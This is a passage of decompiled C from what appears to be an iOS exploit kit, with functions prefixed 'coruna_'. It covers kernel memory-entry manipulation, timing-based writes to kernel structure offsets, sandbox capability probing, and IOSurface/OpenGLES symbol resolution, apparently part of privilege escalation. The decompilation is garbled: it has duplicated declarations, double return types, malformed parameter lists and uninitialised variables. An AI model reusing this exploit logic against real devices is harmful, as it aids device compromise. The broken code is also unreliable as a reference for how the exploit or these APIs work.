      err = coruna_ctx_test_flag(val,0x80000);
      if (err == 0) {
        err = coruna_ctx_test_flag(val,0x4000);
        port = 0x23b080000;
        if ((err == 0) && (err = coruna_ctx_test_flag(val,1), err == 0)) {
          return 0xad022;
        }
        err = coruna_mach_make_memory_entry_2da70(val,port,scratch);
        if (err != 0) {
        return 0xad022;
        }
        tag = 0x1f0023ff;
        err = coruna_ctx_test_flag(val,0x1000000);
        if (err == 0) {
        err = coruna_ctx_test_flag(val,0x100000);
        if (err == 0) {
        err = coruna_ctx_test_flag(val,0x80000);
        if (err == 0) {
        err = coruna_ctx_test_flag(val,0x4000);
        tag = 0x1f0003ff;
        if (err != 0) {
        addr = 0x390;
        if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
        ld11 = (double)NEON_ucvtf(u);
        ld12 = (double)NEON_ucvtf(type_id);
        ld11 = (ld11 / ld12) * k_kernel_rodata_word_37740 * k_kernel_rodata_word_374d0;
        *(uint32_t *)(addr + scratch[0]) = tag;
        do {
        version = _mach_absolute_time();
        if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
        } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
        coruna_semaphore_timedwait(val,1000);
        }
        coruna_mach_port_deallocate_2ddc8(val,scratch);
        return 0;
        }
        err = coruna_ctx_test_flag(val,1);
        if (err == 0) {
        coruna_mach_port_deallocate_2ddc8(val,scratch);
        return 0xad022;
        }
        err = coruna_cpu_core_count();
        err = err == 8;
        handle = 0x388;
        }
        else {
        err = coruna_cpu_core_count();
        if (err < 8) {
        addr = 0x3d0;
        if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
        ld11 = (double)NEON_ucvtf(u);
        ld12 = (double)NEON_ucvtf(type_id);
        ld11 = (ld11 / ld12) * k_kernel_rodata_word_37740 * k_kernel_rodata_word_374d0;
        *(uint32_t *)(addr + scratch[0]) = tag;
        do {
        version = _mach_absolute_time();
        if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
        } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
        coruna_semaphore_timedwait(val,1000);
        }
        coruna_mach_port_deallocate_2ddc8(val,scratch);
        return 0;
        }
        err = coruna_ctx_test_flag(val,0x200000);
        err = err == 0;
        handle = 0x3c0;
        }
        addr = 0x3f8;
        }
        else {
        err = coruna_cpu_core_count();
        if (err < 8) {
        addr = 0x3c8;
        if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
        ld11 = (double)NEON_ucvtf(u);
        ld12 = (double)NEON_ucvtf(type_id);
        ld11 = (ld11 / ld12) * k_kernel_rodata_word_37740 * k_kernel_rodata_word_374d0;
        *(uint32_t *)(addr + scratch[0]) = tag;
        do {
        version = _mach_absolute_time();
        if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
        } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
        coruna_semaphore_timedwait(val,1000);
        }
        coruna_mach_port_deallocate_2ddc8(val,scratch);
        return 0;
        }
        err = coruna_ctx_test_flag(val,0x2000000);
        err = err == 0;
        handle = 0x108;
        addr = 0x430;
        }
        if (!err) {
        addr = handle;
        }
        }
        else {
        addr = 0x408;
        }
        if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
        ld11 = (double)NEON_ucvtf(u);
        ld12 = (double)NEON_ucvtf(type_id);
        ld11 = (ld11 / ld12) * k_kernel_rodata_word_37740 * k_kernel_rodata_word_374d0;
        *(uint32_t *)(addr + scratch[0]) = tag;
        do {
        version = _mach_absolute_time();
        if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
        } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
        coruna_semaphore_timedwait(val,1000);
        }
        coruna_mach_port_deallocate_2ddc8(val,scratch);
        return 0;
      }
      kind = 0x28e580000;
      port = 0x200000;
    }
    else {
      kind = 0x404e80000;
      port = 0x2000000;
    }
    err = coruna_ctx_test_flag(val,port);
    port = 0x23b700000;
    if (err != 0) {
      port = kind;
    }
  }
  else {
    port = 0x23b700000;
  }
fail:
  err = coruna_mach_make_memory_entry_2da70(val,port,scratch);
  if (err != 0) {
    return 0xad022;
  }
  tag = 0x1f0023ff;
  err = coruna_ctx_test_flag(val,0x1000000);
  if (err == 0) {
    err = coruna_ctx_test_flag(val,0x100000);
    if (err == 0) {
      err = coruna_ctx_test_flag(val,0x80000);
      if (err == 0) {
        err = coruna_ctx_test_flag(val,0x4000);
        tag = 0x1f0003ff;
        if (err != 0) {
          addr = 0x390;
          if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
          ld11 = (double)NEON_ucvtf(u);
          ld12 = (double)NEON_ucvtf(type_id);
          ld11 = (ld11 / ld12) * k_kernel_rodata_word_37740 * k_kernel_rodata_word_374d0;
          *(uint32_t *)(addr + scratch[0]) = tag;
          do {
          version = _mach_absolute_time();
          if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
          } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
          coruna_semaphore_timedwait(val,1000);
          }
          coruna_mach_port_deallocate_2ddc8(val,scratch);
          return 0;
        }
        err = coruna_ctx_test_flag(val,1);
        if (err == 0) {
          coruna_mach_port_deallocate_2ddc8(val,scratch);
          return 0xad022;
        }
        err = coruna_cpu_core_count();
        err = err == 8;
        handle = 0x388;
      }
      else {
        err = coruna_cpu_core_count();
        if (err < 8) {
          addr = 0x3d0;
          if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
          ld11 = (double)NEON_ucvtf(u);
          ld12 = (double)NEON_ucvtf(type_id);
          ld11 = (ld11 / ld12) * k_kernel_rodata_word_37740 * k_kernel_rodata_word_374d0;
          *(uint32_t *)(addr + scratch[0]) = tag;
          do {
          version = _mach_absolute_time();
          if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
          } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
          coruna_semaphore_timedwait(val,1000);
          }
          coruna_mach_port_deallocate_2ddc8(val,scratch);
          return 0;
        }
        err = coruna_ctx_test_flag(val,0x200000);
        err = err == 0;
        handle = 0x3c0;
      }
      addr = 0x3f8;
    }
    else {
      err = coruna_cpu_core_count();
      if (err < 8) {
        addr = 0x3c8;
        if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
        ld11 = (double)NEON_ucvtf(u);
        ld12 = (double)NEON_ucvtf(type_id);
        ld11 = (ld11 / ld12) * k_kernel_rodata_word_37740 * k_kernel_rodata_word_374d0;
        *(uint32_t *)(addr + scratch[0]) = tag;
        do {
        version = _mach_absolute_time();
        if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
        } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
        coruna_semaphore_timedwait(val,1000);
        }
        coruna_mach_port_deallocate_2ddc8(val,scratch);
        return 0;
      }
      err = coruna_ctx_test_flag(val,0x2000000);
      err = err == 0;
      handle = 0x108;
      addr = 0x430;
    }
    if (!err) {
      addr = handle;
    }
  }
  else {
    addr = 0x408;
  }
done:
  if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
    ld11 = (double)NEON_ucvtf(u);
    ld12 = (double)NEON_ucvtf(type_id);
    ld11 = (ld11 / ld12) * k_kernel_rodata_word_37740 * k_kernel_rodata_word_374d0;
    *(uint32_t *)(addr + scratch[0]) = tag;
    do {
      version = _mach_absolute_time();
      if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
    } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
    coruna_semaphore_timedwait(val,1000);
  }
  coruna_mach_port_deallocate_2ddc8(val,scratch);
  return 0;
}





bool coruna_kernel600c_via_mach_make_memory_entry_2da70(uint64_t val,long handle,uint64_t *id_2)
{
  int err;
  
  id_2[5] = 0;
  id_2[4] = 0;
  id_2[7] = 0;
  id_2[6] = 0;
  id_2[1] = 0;
  *id_2 = 0;
  id_2[3] = 0;
  id_2[2] = 0;
  err = coruna_mach_make_memory_entry_2da70(val,handle + 0x40000);
  if (err != 0) {
    coruna_mach_port_deallocate_2ddc8(val,id_2);
  }
  return err == 0;
}





long coruna_kernel600c_via_call_mach_vm_machine_attribute_29df8_17fcc_2(long handle,unsigned long arg)
{
  int err;
  long handle;
  uint8_t scratch[32];
  unsigned long bootargs;
  
  err = coruna_call_mach_vm_machine_attribute_29df8_17fcc(handle,arg & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff),
                       scratch);
  if ((err == 0) || (bootargs == 0)) {
    handle = 0;
  }
  else {
    handle = (*(unsigned long *)(handle + 0x188) & arg) + (bootargs & 0xffffffffc000);
  }
  return handle;
}





uint64_t coruna_mach_absolute_time_19dc4(uint64_t val,uint64_t *id_2)
{
  int err;
  uint64_t u;
  uint64_t size;
  uint64_t version;
  unsigned long port;
  double ld6;
  double ld7;
  mach_timebase_info_t scratch;
  
  port = *(unsigned long *)*id_2;
  if ((port & 0x90000000) == 0) {
    err = coruna_ctx_test_flag(val,0x1100000);
    if (err != 0) {
      coruna_semaphore_timedwait(val,1000);
    }
    *(unsigned long *)*id_2 = port | 0x80000000;
    *(uint8_t *)(id_2 + 7) = 1;
    scratch.numer = 0;
    scratch.denom = 0;
    _mach_timebase_info(&scratch);
    ld6 = (double)NEON_ucvtf((unsigned long)scratch >> 0x20);
    ld7 = (double)NEON_ucvtf((unsigned long)scratch & 0xffffffff);
    ld6 = (ld6 / ld7) * k_kernel_rodata_word_37740;
    size = _mach_absolute_time();
    ld6 = ld6 * k_kernel_rodata_word_374d0;
    do {
      version = _mach_absolute_time();
      if ((unsigned long)(long)(ld6 + (double)size) <= version) goto fail;
    } while (((uint)*(uint64_t *)*id_2 >> 0x1c & 1) == 0);
    u = 1;
  }
  else {
fail:
    if (*(char *)(id_2 + 7) != '\0') {
      coruna_mach_absolute_time_19ebc(val,id_2);
    }
    u = 0;
  }
  return u;
}





uint64_t coruna_mach_absolute_time_19ebc(uint64_t val,uint64_t *id_2)
{
  int err;
  uint64_t u;
  uint64_t size;
  unsigned long version;
  double ld5;
  double ld6;
  mach_timebase_info_t scratch;
  
  if (*(char *)(id_2 + 7) != '\0') {
    version = *(unsigned long *)*id_2;
    err = coruna_ctx_test_flag(val,0x1100000);
    if (err != 0) {
      coruna_semaphore_timedwait(val,1000);
    }
    *(unsigned long *)*id_2 = version & 0xffffffff2fffffff | 0x40000000;
    scratch.numer = 0;
    scratch.denom = 0;
    _mach_timebase_info(&scratch);
    ld5 = (double)NEON_ucvtf((unsigned long)scratch >> 0x20);
    ld6 = (double)NEON_ucvtf((unsigned long)scratch & 0xffffffff);
    ld5 = (ld5 / ld6) * k_kernel_rodata_word_37740;
    u = _mach_absolute_time();
    ld5 = ld5 * k_kernel_rodata_word_374d0;
    do {
      size = _mach_absolute_time();
      if ((unsigned long)(long)(ld5 + (double)u) <= size) {
        return 0;
      }
    } while (((uint)*(uint64_t *)*id_2 >> 0x1c & 1) != 0);
    *(uint8_t *)(id_2 + 7) = 0;
  }
  return 1;
}





uint64_t coruna_kernel600c_via_return_zero_1a030(uint64_t val,uint64_t id_2)
{
  void *ptr;
  int err;
  uint64_t u;
  uint64_t scratch;
  uint64_t scratch;
  void *bootargs;
  unsigned long bootargs;
  uint thread_attr;
  void *host_info;
  
  host_info = (void *)0x0;
  thread_attr = 0;
  err = coruna_return_zero_1a030(val,0,0,&host_info,&thread_attr,0);
  ptr = host_info;
  if (err == 0) {
    u = 0xffffffff;
  }
  else {
    scratch = 0x786f62646e6153;
    bootargs = (unsigned long)thread_attr;
    bootargs = host_info;
    scratch = id_2;
    u = coruna_syscall(&scratch,1,&scratch);
    if (ptr != (void *)0x0) {
      _free(ptr);
    }
  }
  return u;
}





uint64_t
void coruna_return_zero_1a030(long handle,uint64_t *val,uint *size,uint64_t *id_2,uint *flags_2,
            int flags)
{
  int err;
  long handle;
  uint64_t u;
  void *ptr;
  uint size;
  void *buf;
  long addr;
  long off;
  long base;
  unsigned long version;
  long ctx_val;
  long scratch;
  uint bootargs;
  uint thread_attr;
  uint64_t host_info;
  
  bootargs = 0;
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    if (err == 0x1809) {
      addr = 0;
      size = 0x10;
      if (*(unsigned long *)(handle + 0x158) < 0x18091e01f00000) {
        size = 0x20;
      }
      base = 4;
      if (*(unsigned long *)(handle + 0x158) < 0x18091e01f00000) {
        base = 8;
      }
      ctx_val = 0x30;
    }
    else {
      if (err != 0x1c1b && err != 0x1f53) {
        return 0;
      }
      addr = 0x10;
      base = 4;
      ctx_val = 0x48;
      size = 0x10;
    }
  }
  else {
    if (err < 0x225c) {
      if (err != 0x1f54 && err != 0x2258) {
        return 0;
      }
    }
    else if (err != 0x225c) {
      if (err != 0x2712) {
        return 0;
      }
      size = 0x10;
      base = 4;
      ctx_val = 0x18;
      addr = 0x18;
      goto fail;
    }
    size = 0x10;
    base = 4;
    ctx_val = 0x18;
    addr = 0x10;
  }
fail:
  off = *(long *)(handle + 0x398);
  handle = coruna_ptr_canonicalize(handle,off);
  if (handle == 0) {
    return 0;
  }
  handle = off;
  if (0x1f5418ffffffff < *(unsigned long *)(handle + 0x158)) {
    u = coruna_kernel600c_residual_228(handle,off + addr,&scratch);
    if ((int)u == 0) {
      return u;
    }
    addr = coruna_ptr_canonicalize(handle,scratch);
    handle = scratch;
    if (addr == 0) {
      return 0;
    }
  }
  u = coruna_kernel600c_residual_228(handle,handle + ctx_val,&scratch);
  if ((int)u == 0) {
    return u;
  }
  if (scratch == 0) {
    ptr = (void *)0x0;
done:
    if ((val == (uint64_t *)0x0) && (size == (uint *)0x0)) {
      *id_2 = ptr;
      *flags_2 = bootargs;
      return 1;
    }
    if (flags == 0) {
      err = coruna_kernel600c_residual_228(handle,off,&scratch);
      if (err != 0) goto cleanup;
check_ok:
      buf = (void *)0x0;
    }
    else {
      scratch = coruna_macho_cstring_1a84c(handle);
      if (scratch == 0) goto check_ok;
cleanup:
      err = coruna_kernel600c_residual_228(handle,scratch,&host_info);
      if (err == 0) goto check_ok;
      err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,scratch + *(int *)(handle + 0x168),4,&thread_attr);
      buf = (void *)0x0;
      if ((((err != 0) && (version = (unsigned long)thread_attr, thread_attr < 0x80001)) &&
          (buf = _malloc(version), buf != (void *)0x0)) &&
         (err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,host_info,version,buf), err != 0)) {
        *id_2 = ptr;
        *flags_2 = bootargs;
        if (val == (uint64_t *)0x0) {
          return 1;
        }
        if (size != (uint *)0x0) {
          *val = buf;
          *size = thread_attr;
          return 1;
        }
        return 1;
      }
    }
    if (buf != (void *)0x0) {
    _free(buf);
    }
    return 0;
  }
  else {
    scratch = coruna_ptr_canonicalize(handle);
    if (scratch == 0) {
      return 0;
    }
    u = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,(base - (unsigned long)size) + scratch,4,&bootargs);
    if ((int)u == 0) {
      return u;
    }
    bootargs = bootargs - size;
    version = (unsigned long)bootargs;
    if (0x3ff < bootargs - 1) {
      return 0;
    }
    ptr = _malloc(version);
    if (ptr == (void *)0x0) {
      return 0;
    }
    err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,scratch,version,ptr);
    if (err != 0) goto done;
    buf = (void *)0x0;
  }
  _free(ptr);
skip:
  if (buf != (void *)0x0) {
    _free(buf);
  }
  return 0;
}





void coruna_kernel600c_via_ctx_test_flag_7(long handle,unsigned long arg)
{
  uint8_t *ptr;
  int err;
  unsigned long u;
  long handle;
  uint64_t scratch;
  uint bootargs;
  void *thread_attr;
  uint host_info;
  void *serial_buf;
  char action [8];
  uint5 scratch;
  uint32_t bootargs;
  void *block_ctx;
  unsigned long thread_attr;
  long stack_guard;
  
  ptr = k_kernel_mach_task_self_slot;
  stack_guard = *(long *)k_kernel_stack_chk_guard_slot;
  u = coruna_kernel600c_via_kernel600c_via_ptr_canonicalize_5(handle,*(uint32_t *)k_kernel_mach_task_self_slot);
  if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
  return;
  }
  ___stack_chk_fail(u);
}





uint64_t coruna_return_zero_1a5c8(long handle,void (*val,uint64_t val)
{
  long handle;
  int err;
  uint64_t u;
  long addr;
  
  if (handle == 0) {
    return 0;
  }
  if (arg == (void (*)0x0) {
    return 0;
  }
  u = coruna_kernel600c_via_kernel600c_via_ptr_canonicalize_5(handle,*(uint32_t *)k_kernel_mach_task_self_slot);
  if ((int)u == 0) {
    return u;
  }
  addr = *(long *)(handle + 0x3a8);
  if (addr == 0) {
    (*arg)(val);
  }
  else {
    handle = *(long *)(&k_kernel_slot_18f0 + handle) +
            (unsigned long)(uint)((*(int *)(handle + 0x37c) + 1) * *(int *)(handle + 0x168));
    if ((((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1)) ||
        (*(int *)(&k_kernel_slot_1940 + handle) == -1)) ||
       ((*(long *)(handle + 0x218) == 0 || (*(char *)(handle + 0xc) != '\0')))) {
      u = coruna_call_mach_vm_machine_attribute_29df8_1e8e0(handle,handle,0);
      err = (int)u;
    }
    else {
      u = coruna_kernel600c_via_mach_make_memory_entry_2da70_2(handle,handle,0);
      err = (int)u;
    }
    if (err == 0) {
      return u;
    }
    (*arg)(val);
    if (((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1)) ||
       ((*(int *)(&k_kernel_slot_1940 + handle) == -1 ||
        ((*(long *)(handle + 0x218) == 0 || (*(char *)(handle + 0xc) != '\0')))))) {
      u = coruna_call_mach_vm_machine_attribute_29df8_1e8e0(handle,handle,addr);
      err = (int)u;
    }
    else {
      u = coruna_kernel600c_via_mach_make_memory_entry_2da70_2(handle,handle,addr);
      err = (int)u;
    }
    if (err == 0) {
      return u;
    }
  }
  return 1;
}





unsigned long coruna_sandbox_check(int arg)

{
  uint8_t *str;
  pid_t lp2;
  int fd_12;
  unsigned long size;
  
  lp2 = _getpid();
  size = _sandbox_check(lp2,0,0);
  if ((int)size == 0) {
    return size;
  }
  lp2 = _getpid();
  str = k_kernel_sandbox_check_no_report_slot;
  fd_12 = _sandbox_check(lp2,"mach-lookup",*(uint *)k_kernel_sandbox_check_no_report_slot | 2);
  if (fd_12 == 0) {
    lp2 = _getpid();
    fd_12 = _sandbox_check(lp2,"mach-lookup",*(uint *)str | 2);
    if (fd_12 == 0 || arg == 0) {
      return (unsigned long)(fd_12 != 0);
    }
    lp2 = _getpid();
    size = _sandbox_check(lp2,"syscall-unix",*(uint32_t *)str);
    if ((int)size == 1) {
      return size;
    }
    fd_12 = _socket(2,2,0);
    if (fd_12 == -1) {
      return 1;
    }
    _close(fd_12);
  }
  return 0;
}





uint64_t coruna_sandbox_check_1a804(long handle)
{
  pid_t lp1;
  int err;
  uint64_t u;
  
  lp1 = _getpid();
  err = _sandbox_check(lp1,0,0);
  if ((err == 0) || (u = 0, err == 1)) {
    *(char *)(handle + 10) = (char)err;
    u = 1;
  }
  return u;
}





long coruna_macho_cstring_1a84c(long handle)
{
  uint8_t *ptr;
  int err;
  long handle;
  long addr;
  unsigned long u;
  uint8_t scratch[24];
  uint8_t bootargs[24];
  
  if (*(long *)(handle + 0x5c0) != 0) {
    return *(long *)(handle + 0x5c0);
  }
  if (((*(long *)(handle + 0x118) == 0) || (*(long *)(handle + 0x120) == 0)) ||
     (handle = *(long *)(*(long *)(handle + 0x118) + 0x130), handle == 0)) {
    err = coruna_ctx_test_flag(handle,0x1000);
    ptr = &k_kernel_slot_1d18;
    if (err != 0) {
      ptr = &k_kernel_slot_19f8;
    }
    handle = *(long *)(ptr + handle);
    if (handle == 0) {
      return 0;
    }
    coruna_macho_map_segsect(bootargs,handle,"__TEXT","__cstring");
    addr = coruna_kernel600c_via_kernel509_via_cat(bootargs,"appleevent-send",0,1);
    if (addr == 0) {
      return 0;
    }
    coruna_macho_map_segsect(scratch,handle,"__DATA_CONST","__const");
    addr = coruna_kernel600c_via_call_mach_vm_machine_attribute_29df8(scratch,addr,*(uint8_t *)(handle + 0x34),1);
    if (addr == 0) {
      return 0;
    }
    if (*(int *)(handle + 0x140) < 0x1c1b) {
      if (*(int *)(handle + 0x140) < 0x1809) {
        u = coruna_sizeof_ptr(handle);
        addr = coruna_kernel600c_trampoline_00012ad4(handle,addr + (u & 0xffffffff) * -2);
      }
      else {
        addr = addr + -0x80;
      }
    }
    else {
      addr = addr + -0xb8;
    }
    handle = coruna_ptr_canonicalize(handle,addr);
    if (handle == 0) {
      return 0;
    }
    if ((*(long *)(handle + 0x118) != 0) && (*(long *)(handle + 0x120) != 0)) {
      *(long *)(*(long *)(handle + 0x118) + 0x130) = handle;
    }
  }
  *(long *)(handle + 0x5c0) = handle;
  return handle;
}





bool coruna_kernel600c_residual_225(long handle,short *arg,uint64_t val)
{
  int err;
  long handle;
  uint u;
  long addr;
  int status;
  void *ptr;
  uint size;
  long off;
  unsigned long version;
  uint port;
  uint scratch;
  
  if (((*(int *)(handle + 0x140) == 0x1c1b || *(int *)(handle + 0x140) == 0x1809) &&
      (size = (uint)val, 0xb < size)) && (-1 < *arg)) {
    off = (unsigned long)*(byte *)((long)arg + 5) * 2;
    addr = (unsigned long)*(byte *)(arg + 5) + (unsigned long)(ushort)arg[4] +
            (unsigned long)*(byte *)((long)arg + 0xb);
    handle = off + addr * 2 + 0xc;
    port = (uint)handle;
    if (port <= size) {
      u = port + (uint)*(byte *)(arg + 2) * 2;
      err = 0;
      if ((u & 6) != 0) {
        err = 8 - (u & 6);
      }
      u = err + u;
      scratch = u;
      ptr = _calloc((unsigned long)(size << 3),1);
      if (ptr == (void *)0x0) {
        return false;
      }
      if (port < u) {
        version = 0;
        err = (int)addr * 2 + (int)off + 0xc;
        do {
          size = (uint)*(ushort *)((long)arg + version + handle);
          if (size == 0) break;
          size = u + size * 8;
          if (size < (uint)(err + (int)version)) {
            status = -2;
            _free(ptr);
            return status == 0;
          }
          status = coruna_kernel600c_residual_226(arg,val,ptr,u,size,&scratch);
          _free(ptr);
          return status == 0;
        } while (err + size < scratch);
      }
      status = 0;
fail:
      _free(ptr);
      return status == 0;
    }
  }
  return false;
}





uint64_t
void coruna_kernel600c_residual_226(long handle,uint64_t val,long addr_2,uint64_t id_2,uint size,
            uint *flags_2)
{
  char *ptr;
  uint64_t u;
  
  if ((uint)val < size + 8) {
    u = 0xffffffff;
  }
  else {
    if (*(char *)(addr_2 + (unsigned long)(size >> 3)) == '\0') {
      *(uint8_t *)(addr_2 + (unsigned long)(size >> 3)) = 1;
      if (size < *flags_2) {
        *flags_2 = size;
      }
      ptr = (char *)(handle + (unsigned long)size);
      if (*ptr == '\x01') {
        if ((*(ushort *)(ptr + 1) & 1) != 0) {
          *(ushort *)(ptr + 1) = *(ushort *)(ptr + 1) & 0xfffa;
        }
      }
      else {
        u = coruna_kernel600c_residual_226(handle,val,addr_2,id_2,
                             (int)id_2 + (uint)*(ushort *)(ptr + 4) * 8,flags_2);
        if ((int)u != 0) {
          return u;
        }
        u = coruna_kernel600c_residual_226(handle,val,addr_2,id_2,
                             (int)id_2 + (uint)*(ushort *)(ptr + 6) * 8,flags_2);
        if ((int)u != 0) {
          return u;
        }
      }
    }
    u = 0;
  }
  return u;
}





uint64_t coruna_dlopen_iosurface_1abf4(long handle)
{
  int err;
  uint64_t *ptr;
  long handle;
  long addr;
  long off;
  uint64_t *buf;
  
  err = coruna_ioobjectrelease("IOSurfaceRoot",0x78);
  if (err == 0) {
    if (*(long *)(&k_kernel_slot_18d0 + handle) != 0) {
      return 1;
    }
    ptr = _calloc(1,0xe0);
    if (ptr == (uint64_t *)0x0) {
      return 0;
    }
    handle = _dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface",1);
    if (handle != 0) {
      addr = _dlopen("/System/Library/Frameworks/OpenGLES.framework/OpenGLES",1);
      if (addr != 0) {
        off = _dlsym(addr,"glEnable");
        ptr[0xc] = off;
        if (off != 0) {
          off = _dlsym(addr,"glClear");
          ptr[0xd] = off;
          if (off != 0) {
            off = _dlsym(addr,"glFlush");
            ptr[0xe] = off;
            if (off != 0) {
              off = _dlsym(addr,"glViewport");
              ptr[0x1b] = off;
              if (off != 0) {
                off = _dlsym(addr,"glGetIntegerv");
                ptr[0x1a] = off;
                if (off != 0) {
                  off = _dlsym(addr,"glDeleteFramebuffersOES");
                  ptr[0x19] = off;
                  if (off != 0) {
                    off = _dlsym(addr,"glDeleteRenderbuffersOES");
                    ptr[0x18] = off;
                    if (off != 0) {
                      off = _dlsym(addr,"glGetFramebufferAttachmentParameterivOES");
                      ptr[0x17] = off;
                      if (off != 0) {
                        off = _dlsym(addr,"glScissor");
                        ptr[0x16] = off;
                        if (off != 0) {
                          off = _dlsym(addr,"glCheckFramebufferStatusOES");
                          ptr[0x15] = off;
                          if (off != 0) {
                            off = _dlsym(addr,"glRenderbufferStorageOES");
                            ptr[0x14] = off;
                            if (off != 0) {
                              off = _dlsym(addr,"glFramebufferRenderbufferOES");
                              ptr[0x13] = off;
                              if (off != 0) {
                                off = _dlsym(addr,"glBindRenderbufferOES");
                                ptr[0x12] = off;
                                if (off != 0) {
                                  off = _dlsym(addr,"glGenRenderbuffersOES");
                                  ptr[0x11] = off;
                                  if (off != 0) {
                                    off = _dlsym(addr,"glBindFramebufferOES");
                                    ptr[0x10] = off;
                                    if (off != 0) {
                                      off = _dlsym(addr,"glGenFramebuffersOES");
                                      ptr[0xf] = off;
                                      if (off != 0) {
                                        off = _dlsym(handle,"IOSurfaceLock");
                                        ptr[10] = off;
                                        if (off != 0) {
                                          off = _dlsym(handle,"IOSurfaceUnlock");
                                          ptr[0xb] = off;
                                          if (off != 0) {
                                            off = _dlsym(handle,"IOSurfaceGetSeed");
                                            ptr[9] = off;
                                            if (off != 0) {
                                              off = _dlsym(handle,"IOSurfaceCreate");
                                              ptr[8] = off;
                                              if ((off != 0) &&
                                                 (buf = (uint64_t *)
                                                           _dlsym(handle,"kIOSurfaceAllocSize"),
                                                 buf != (uint64_t *)0x0)) {
                                                ptr[7] = *buf;
                                                buf = (uint64_t *)
                                                         _dlsym(handle,"kIOSurfacePixelFormat");
                                                if (buf != (uint64_t *)0x0) {
                                                  ptr[6] = *buf;
                                                  buf = (uint64_t *)
                                                           _dlsym(handle,"kIOSurfaceBytesPerElement")
                                                  ;
                                                  if (buf != (uint64_t *)0x0) {
                                                    ptr[5] = *buf;
                                                    buf = (uint64_t *)
                                                             _dlsym(handle,"kIOSurfaceHeight");
                                                    if (buf != (uint64_t *)0x0) {
                                                      ptr[4] = *buf;
                                                      buf = (uint64_t *)
                                                               _dlsym(handle,"kIOSurfaceWidth");
                                                      if (buf != (uint64_t *)0x0) {
                                                        ptr[3] = *buf;
                                                        buf = (uint64_t *)
                                                                 _dlsym(handle,
                                                  "kIOSurfaceBytesPerRow");
                                                  if (buf != (uint64_t *)0x0) {
                                                    ptr[2] = *buf;
                                                    buf = (uint64_t *)
                                                             _dlsym(handle,"kIOFenceAllowTearing");
                                                    if (buf != (uint64_t *)0x0) {
                                                      ptr[1] = *buf;
                                                      buf = (uint64_t *)
                                                               _dlsym(handle,"kIOSurfaceIsGlobal");
                                                      if (buf != (uint64_t *)0x0) {
                                                        *ptr = *buf;
                                                        _dlclose(handle);
                                                        _dlclose(addr);
                                                        *(uint64_t **)(&k_kernel_slot_18d0 + handle) =
                                                             ptr;
                                                        return 1;
                                                      }
                                                    }
                                                  }
                                                  }
                                                  }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
        _dlclose(handle);
        handle = addr;
      }
      _dlclose(handle);
    }
    _free(ptr);
  }
  return 0;
}





uint64_t coruna_dispatch_get_global_queue(long handle,long addr_2,int flags,uint8_t buf)
{
  dispatch_group_t ptr;
  dispatch_queue_t buf;
  uint64_t u;
  long handle;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long serial_buf;
  long action;
  long block_ctx;
  uint8_t stack_guard;
  uint8_t sa_saved;
  
  handle = *(long *)(&k_kernel_slot_18d0 + handle);
  if (handle == 0) {
fail:
    u = 0;
  }
  else {
    ptr = _dispatch_group_create();
    *(dispatch_group_t *)(addr_2 + 0x18) = ptr;
    *(uint32_t *)(addr_2 + 0x21) = 0;
    *(uint32_t *)(addr_2 + 0x22) = 0;
    buf = _dispatch_get_global_queue(0,0);
    scratch = k_kernel_nsconcretestackblock_slot;
    bootargs = k_kernel_rodata_word_37730;
    thread_attr = coruna_cfdictionarycreatemutable;
    host_info = &k_kernel_rodata_word_38858;
    sa_saved = (uint8_t)flags;
    serial_buf = handle;
    action = addr_2;
    block_ctx = handle;
    stack_guard = buf;
    _dispatch_group_async(ptr,buf,&scratch);
    if (flags != 0) {
      do {
        if ((*(byte *)(addr_2 + 0x21) & 1) != 0) break;
      } while ((*(byte *)(addr_2 + 0x22) & 1) == 0);
      if ((*(byte *)(addr_2 + 0x22) & 1) != 0) goto fail;
    }
    u = 1;
  }
  return u;
}





void coruna_cfdictionarycreatemutable(long handle)
{
  uint u;
  uint64_t *ptr;
  long *ptr;
  int err;
  uint64_t size;
  uint64_t version;
  long handle;
  long addr;
  uint scratch;
  uint scratch;
  uint32_t bootargs;
  uint32_t thread_attr;
  uint32_t host_info;
  
  ptr = *(uint64_t **)(handle + 0x20);
  ptr = *(long **)(handle + 0x28);
  size = _sel_registerName("alloc");
  version = _objc_getClass("EAGLContext");
  handle = _objc_msgSend(version,size);
  if (handle != 0) {
    size = _sel_registerName("initWithAPI:sharegroup:");
    handle = _objc_msgSend(handle,size,2,0);
    if (handle != 0) {
